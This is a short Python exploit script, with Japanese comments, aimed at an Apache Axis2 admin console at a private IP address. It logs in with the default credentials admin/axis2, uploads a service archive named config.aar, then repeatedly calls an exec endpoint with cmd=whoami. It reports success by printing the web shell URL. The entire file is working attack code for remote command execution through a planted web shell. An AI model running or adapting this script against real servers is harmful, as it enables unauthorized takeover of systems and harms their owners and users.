import requests
import time

# Axis2 管理者の認証情報
username = 'admin'
password = 'axis2'
target_url = 'http://192.168.40.47:8080/axis2'
uploadFile = "config.aar"

# ログインしてセッションを取得
login_url = f'{target_url}/axis2-admin/login'
session = requests.Session()
login_data = {
    'userName': username,
    'password': password,
    'submit': '+Login+'
}
response = session.post(login_url, data=login_data)

if response.status_code != 200:
    print('Login failed')
    exit()

# JAR ファイルをアップロード
upload_url = f'{target_url}/axis2-admin/upload'

# ファイルアップロードはBoundary(バウンダリ)で境界を設定する必要があるのでその設定
# Noneのところはファイルがあれば設定かな？
files = {
    'filename'    : (uploadFile, open(uploadFile, 'rb'), 'application/octet-stream'),
}
# 送信
response = session.post(f'{target_url}/axis2-admin/upload', files=files)


if response.status_code == 200:
    print('Upload successful')
else:
    print('Upload failed')


# 反映されるまでに時間がかかるのでSleepするべき？
service_name = 'config'
run_url = f'{target_url}/services/{service_name}/exec?cmd=whoami'

count = 0
while (True):
    print('Service Runnning Wait....')
    time.sleep(3)
    # アップロードしたサービスの確認
    response = session.get(run_url)

    if response.status_code == 200:
        print('Exploit Success!!\n')
        print(response.text)
        print(f'Webshell is {run_url}')
        break
    else:
        count += 1
        if(count > 10):
            print('Failed to run the service')
            break

